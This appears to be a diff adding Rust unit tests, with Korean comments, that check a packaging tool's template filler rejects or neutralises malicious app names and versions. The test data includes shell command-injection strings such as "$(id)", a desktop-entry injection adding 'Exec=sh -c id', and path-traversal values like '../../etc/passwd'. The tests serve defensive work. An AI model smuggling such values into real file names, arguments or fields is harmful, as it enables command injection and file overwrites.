+        for evil in [EVIL_NAME, "a'; id; echo '", "$(id)", "앱\n[Desktop Entry]", "\\", "'''"] {
+            let out = fill(INSTALL_SH, "app", evil, "0.1.0", Syntax::Shell);
+            let path = dir.path().join("install.sh");
+            std::fs::write(&path, &out).unwrap();
+            // 문법 검사만 한다 (-n). 인용이 깨졌으면 여기서 잡힌다.
+            match std::process::Command::new("bash").arg("-n").arg(&path).output() {
+                Ok(o) => assert!(o.status.success(), "{evil:?}: {}", String::from_utf8_lossy(&o.stderr)),
+                Err(e) => {
+                    eprintln!("bash 가 없어 문법 검사를 건너뜁니다: {e}");
+                    return;
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn a_malicious_name_cannot_add_desktop_keys_or_groups() {
+        let evil = "앱\nActions=pwn\n\n[Desktop Action pwn]\nExec=sh -c id";
+        let out = fill(DESKTOP, "app", evil, "0.1.0", Syntax::Desktop);
+
+        // 값은 한 줄로 접힌다 — 주입한 글자는 Name 값 안에 남지만 새 키도 새 그룹도 되지 못한다.
+        assert!(!out.lines().any(|l| l.starts_with("Actions=")), "{out}");
+        assert!(!out.lines().any(|l| l.starts_with("[Desktop Action")), "{out}");
+        assert!(!out.lines().any(|l| l.starts_with("Exec=sh")), "{out}");
+        assert_eq!(out.lines().filter(|l| l.starts_with('[')).count(), 1, "{out}");
+        let name_lines: Vec<&str> = out.lines().filter(|l| l.starts_with("Name=")).collect();
+        assert_eq!(name_lines.len(), 1, "{out}");
+        assert!(name_lines[0].contains(r"\nActions=pwn"), "{name_lines:?}");
+    }
+
+    #[test]
+    fn control_characters_never_reach_the_output() {
+        let evil = "앱\u{0}\u{1}\r\n\t끝";
+        for out in [
+            fill(INSTALL_SH, "app", evil, "0.1.0", Syntax::Shell),
+            fill(README_LINUX, "app", evil, "0.1.0", Syntax::Text),
+            fill(README_WINDOWS, "app", evil, "0.1.0", Syntax::Text),
+        ] {
+            assert!(!out.contains('\u{0}'), "{out}");
+            assert!(!out.contains('\u{1}'), "{out}");
+        }
+        // Desktop 은 명세대로 두 글자 표기로 바꾼다 — 실제 제어문자는 남지 않는다.
+        let escaped = desktop_escape(evil);
+        assert!(!escaped.chars().any(|c| c.is_control()), "{escaped}");
+        assert!(escaped.contains(r"\r\n\t"), "{escaped}");
+        assert_eq!(desktop_escape(r"a\b"), r"a\\b");
+    }
+
+    #[test]
+    fn slug_stays_safe_for_file_names() {
+        for evil in [EVIL_NAME, "../../etc/passwd", "a/b", "앱\n이름", "..", r"C:\x", "."] {
+            let slug = slugify(evil);
+            assert!(
+                slug.chars()
+                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
+                "{evil} → {slug}"
+            );
+            assert!(!slug.is_empty() && slug != "." && slug != "..", "{evil} → {slug}");
+        }
+    }
+
+    #[test]
+    fn a_version_with_path_separators_is_refused() {
+        for evil in [
+            "../../../etc/cron.d/x",
+            "0.1.0/../..",
+            "1.0",
+            "",
+            "0.1.0\nx",
+            r"0.1.0\..\..",
+        ] {
+            assert!(check_version(evil).is_err(), "{evil:?} 는 거부해야 합니다");
+        }
+        assert_eq!(check_version(" 0.1.0 ").unwrap(), "0.1.0");
+        assert_eq!(check_version("1.2.3-beta.1+build").unwrap(), "1.2.3-beta.1+build");
+    }
+
+    #[test]
+    fn artifacts_must_land_inside_the_output_folder() {
+        let dir = tempfile::tempdir().unwrap();
+        ensure_inside(dir.path(), &dir.path().join("app.tar.gz")).unwrap();
+        let sub = dir.path().join("nested");
+        std::fs::create_dir(&sub).unwrap();
+        ensure_inside(dir.path(), &sub.join("app.tar.gz")).unwrap();
+        // 부모 폴더로 나가면 거부.
+        assert!(ensure_inside(&sub, &dir.path().join("app.tar.gz")).is_err());
     }
 
     #[test]
